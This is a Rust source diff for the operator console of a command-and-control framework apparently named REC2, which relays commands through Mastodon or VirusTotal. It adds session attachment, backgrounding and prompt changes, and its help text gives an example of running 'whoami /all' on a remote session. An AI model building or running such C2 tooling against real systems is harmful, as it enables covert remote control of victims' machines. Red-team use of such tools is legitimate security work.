@@ -12,7 +12,7 @@ use clap::{Arg, ArgMatches, ArgAction, value_parser, Command};
 use crate::args::{Options,Social};
 use crate::c2::sessions::{Session,remove_all_jobs_for_all_sessions,kill_session};
 use crate::c2::jobs::Job;
-use crate::c2::{get_sessions, display_sessions, display_jobs, exec_command, get_output_command};
+use crate::c2::{get_sessions, set_session, background_sessions, display_sessions, display_jobs, exec_command, get_output_command};
 use crate::modules::{rec2mastodon,rec2virustotal};
 
 /// Default timeout after which tasks are backgrounded
@@ -29,6 +29,7 @@ pub enum Mode {
     Exec,
     ListSessions,
     SetSessions,
+    Background,
     ListJobs,
     GetOutput,
     Clear,
@@ -44,6 +45,13 @@ pub struct Commands {
     pub session_id: u32,
     pub job_id: u32,
     pub cmd: String,
+}
+
+/// Rustyline args
+#[derive(Debug)]
+pub struct Environnement {
+    pub selected_session_id: u32,
+    pub information_target: String,
 }
 
 // New empty command line for shell
@@ -75,6 +83,7 @@ impl Shell {
 
     /// Start shell
     pub async fn run(&self) {
+        // Read lines from shell
         Self::read_line(&self.sargs)
             .await
             .ok();
@@ -100,6 +109,9 @@ impl Shell {
                         .value_parser(value_parser!(u32))
                     )
                 )
+            .subcommand(Command::new("background")
+                .about("Put current session in the background")
+                )
             .subcommand(Command::new("jobs")
                     .about("List all jobs")
             )
@@ -115,8 +127,8 @@ impl Shell {
                     .arg(Arg::new("id")
                         .short('i')
                         .long("id")
-                        .help("session ID where to run command\nexec -i 1 -c \"whoami /all\"")
-                        .required(true)
+                        .help("Session ID where to run command\nOptionnal if you already have session attached\n\nexec -i 1 -c \"whoami /all\"")
+                        .required(false)
                         .value_parser(value_parser!(u32))
                     )
                     .arg(Arg::new("command")
@@ -154,13 +166,17 @@ impl Shell {
     /// Parsing clap arguments
     pub fn from_args(
         args: &[String],
+        env: &mut Environnement,
     ) -> clap::error::Result<Option<Commands>> {
         let matches = Self::cli().try_get_matches_from(args)?;
-        Self::from_matches(&matches)
+        Self::from_matches(&matches,env)
     }
 
     /// Commands in readline rustyline return Commands struct
-    fn from_matches(matches: &ArgMatches) -> clap::error::Result<Option<Commands>> {
+    fn from_matches(
+        matches: &ArgMatches,
+        env: &mut Environnement,
+    ) -> clap::error::Result<Option<Commands>> {
         let mut mode = Mode::Unknown;
         let mut session_id: u32 = 00000;
         let mut job_id: u32 = 00000;
@@ -176,16 +192,28 @@ impl Shell {
             Some(("sessions", sub_matches)) => {
                 mode = Mode::ListSessions;
                 if sub_matches.contains_id("id") {
-                    session_id = sub_matches.get_one::<u32>("id").map(|s| s.to_owned()).unwrap();
-                    mode = Mode::SetSessions;
+                    session_id = sub_matches.get_one::<u32>("id").map(|s| s.to_owned()).unwrap_or(0);
+                    if session_id != 0 {
+                        mode = Mode::SetSessions;
+                    } else { 
+                        error!("Session cannot be 0!");
+                        mode = Mode::Unknown;
+                    }
                 }
+            }
+            Some(("background", _sub_matches)) => {
+                mode = Mode::Background;
             }
             Some(("jobs", _sub_matches)) => {
                 mode = Mode::ListJobs;
             }
             Some(("exec", sub_matches)) => {
                 mode = Mode::Exec;
-                session_id = sub_matches.get_one::<u32>("id").map(|s| s.to_owned()).unwrap();
+                session_id = sub_matches.get_one::<u32>("id").map(|s| s.to_owned()).unwrap_or(env.selected_session_id);
+                if session_id == 0 {
+                    error!("Please select session ID with '-i' or attach one session with 'sessions -i ID'");
+                    mode = Mode::Unknown;
+                }
                 cmd = sub_matches.get_one::<String>("command").map(|s| s.to_owned()).unwrap();
             }
             Some(("get", sub_matches)) => {
@@ -212,7 +240,7 @@ impl Shell {
 
     /// Build and run read_line
     async fn read_line(
-        common_args: &Options
+        common_args: &Options,
     ) -> Result<()> {
 
         let mut rl = DefaultEditor::new()?;
@@ -224,9 +252,13 @@ impl Shell {
         // Prepare Hashmap with sessions and jobs here
         let mut sessions: Vec<Session> = Vec::new();
         let mut jobs: Vec<Job> = Vec::new();
+        let mut env: Environnement = Environnement{
+            selected_session_id: 0,
+            information_target: "".to_string(),
+        };
 
         loop {
-            let readline = rl.readline(Self::make_prompt(&common_args.social).as_str());
+            let readline = rl.readline(Self::make_prompt(&common_args.social, &mut env, &sessions).as_str());
             match readline {
                 Ok(line) => {
                     Self::handle_line(
@@ -235,6 +267,7 @@ impl Shell {
                         &common_args,
                         &mut sessions,
                         &mut jobs,
+                        &mut env,
                     )
                     .await
                     .ok();
@@ -248,21 +281,81 @@ impl Shell {
         Ok(())
     }
 
-    // Function to make prompt 'SC2:X> '
-    fn make_prompt(mode: &Social) -> String {
+    // Function to make prompt 'REC2:X> '
+    fn make_prompt(
+        mode: &Social,
+        env: &mut Environnement,
+        sessions: &Vec<Session>,
+    ) -> String {
+        let mut _result = String::from("empty");
         match mode {
-            Social::Mastodon => { 
-                return format!("{}{}:{}> ","REC".truecolor(30,30,30).bold().on_bright_white(),"2".red().bold().on_bright_white(),"Mastodon".truecolor(89,90,255).bold())
+            Social::Mastodon => {
+                trace!("Set active session to {:?}",&env.selected_session_id);
+                if env.selected_session_id > 0 && sessions.len() >= env.selected_session_id as usize  {
+                    if sessions[env.selected_session_id as usize - 1].available == true {
+                        _result = format!("{}{}:{}:{}{}:{}> ",
+                            "REC".truecolor(30,30,30).bold().on_bright_white(),
+                            "2".red().bold().on_bright_white(),
+                            "Mastodon".truecolor(89,90,255).bold(),
+                            "SESS".truecolor(30,30,30).bold().on_bright_white(),
+                            env.selected_session_id.to_string().truecolor(204,0,204).bold().on_bright_white(),
+                            env.information_target.to_string().green().bold(),
+                            )
+                    } else {
+                        error!("Selected session inactive or killed..");
+                        _result = format!("{}{}:{}> ",
+                            "REC".truecolor(30,30,30).bold().on_bright_white(),
+                            "2".red().bold().on_bright_white(),
+                            "Mastodon".truecolor(89,90,255).bold(),
+                        );
+                        env.selected_session_id = 0;
+                    }
+                }
+                else {
+                    _result = format!("{}{}:{}> ",
+                        "REC".truecolor(30,30,30).bold().on_bright_white(),
+                        "2".red().bold().on_bright_white(),
+                        "Mastodon".truecolor(89,90,255).bold(),
+                    )
+                }
             }
-            // // Example
-            Social::VirusTotal => { 
-                return format!("{}{}:{}> ","REC".truecolor(30,30,30).bold().on_bright_white(),"2".red().bold().on_bright_white(),"VirusTotal".truecolor(11,77,218).bold())
+            Social::VirusTotal => {
+                trace!("Set active session to {:?}",&env.selected_session_id);
+                if env.selected_session_id > 0 && sessions.len() >= env.selected_session_id as usize {
+                    if sessions[env.selected_session_id as usize - 1].available == true {
+                        _result =  format!("{}{}:{}:{}{}:{}> ",
+                            "REC".truecolor(30,30,30).bold().on_bright_white(),
+                            "2".red().bold().on_bright_white(),
+                            "VirusTotal".truecolor(11,77,218).bold(),
+                            "SESS".truecolor(30,30,30).bold().on_bright_white(),
+                            env.selected_session_id.to_string().truecolor(204,0,204).bold().on_bright_white(),
+                            env.information_target.to_string().green().bold(),
+                        )
+                    }
+                    else { 
+                        error!("Selected session inactive or killed..");
+                        _result =  format!("{}{}:{}> ",
+                            "REC".truecolor(30,30,30).bold().on_bright_white(),
+                            "2".red().bold().on_bright_white(),
+                            "VirusTotal".truecolor(11,77,218).bold()
+                        );
+                        env.selected_session_id = 0;
+                    }
+                }
+                else {
+                    _result =  format!("{}{}:{}> ",
+                        "REC".truecolor(30,30,30).bold().on_bright_white(),
+                        "2".red().bold().on_bright_white(),
+                        "VirusTotal".truecolor(11,77,218).bold()
+                    )
+                }
             }
             _ => {
                 error!("Error making prompt for Social::{:?}", mode);
                 process::exit(EXIT_FAILURE)
-            } 
+            }
         }
+        return _result
     }
 
     /// Handle an input line
@@ -272,6 +365,7 @@ impl Shell {
         default_args: &Options,
         sessions: &mut Vec<Session>,
         jobs: &mut Vec<Job>,
+        env: &mut Environnement,
     ) -> Result<()> {
         // Rustyline terminal
         // Add new history line
@@ -291,7 +385,7 @@ impl Shell {
         args.insert(0, "server".into());
 
         // Parse options
-        let commands = match Shell::from_args(&args) {
+        let commands = match Shell::from_args(&args,env) {
             Ok(commands) => commands,
             Err(err) => {
                 println!("{}", err);
@@ -319,9 +413,11 @@ impl Shell {
                 },
                 Mode::SetSessions => {
                     debug!("Calling function Set Session..");
-                    get_sessions(default_args, sessions).await;
-                    //set_session(commands.session_id, sessions);
-                    // TODO
+                    set_session(commands.session_id, env, sessions);
+                },
+                Mode::Background => {
+                    debug!("Calling function put current session in background..");
+                    background_sessions(env);
                 },
                 Mode::ListJobs => {
                     debug!("Calling function List Jobs..");
